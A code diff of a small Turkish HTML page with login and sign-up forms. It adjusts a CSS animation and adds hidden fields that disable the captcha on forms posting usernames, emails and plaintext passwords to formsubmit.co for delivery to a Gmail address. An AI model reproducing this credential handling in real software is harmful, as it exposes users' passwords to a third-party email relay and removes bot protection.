@@ -65,6 +65,7 @@
       box-shadow: 0 10px 20px rgba(0,0,0,0.1);
       width: 300px;
       transition: transform 0.3s ease;
+      animation: fadeIn 0.8s ease-in-out;
     }
 
     .card:hover {
@@ -126,10 +127,6 @@
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-
-    .card {
-      animation: fadeIn 0.8s ease-in-out;
-    }
   </style>
 </head>
 <body>
@@ -145,6 +142,8 @@
     <div class="card">
       <h2>Giriş Yap</h2>
       <form action="https://formsubmit.co/HYYazilim@gmail.com" method="POST">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
         <input type="text" name="username" placeholder="Kullanıcı Adı" required>
         <input type="password" name="password" placeholder="Şifre" required>
         <button type="submit">Giriş Yap</button>
@@ -154,6 +153,8 @@
     <div class="card">
       <h2>Kayıt Ol</h2>
       <form action="https://formsubmit.co/HYYazilim@gmail.com" method="POST">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
         <input type="text" name="new_username" placeholder="Yeni Kullanıcı Adı" required>
         <input type="email" name="email" placeholder="E-posta" required>
         <input type="password" name="new_password" placeholder="Şifre" required>
@@ -179,7 +180,6 @@
       }
     }
 
-    // Sayfa yüklenince tema ayarı uygula
     window.onload = () => {
       const savedTheme = localStorage.getItem("theme");
       if (savedTheme === "dark") {
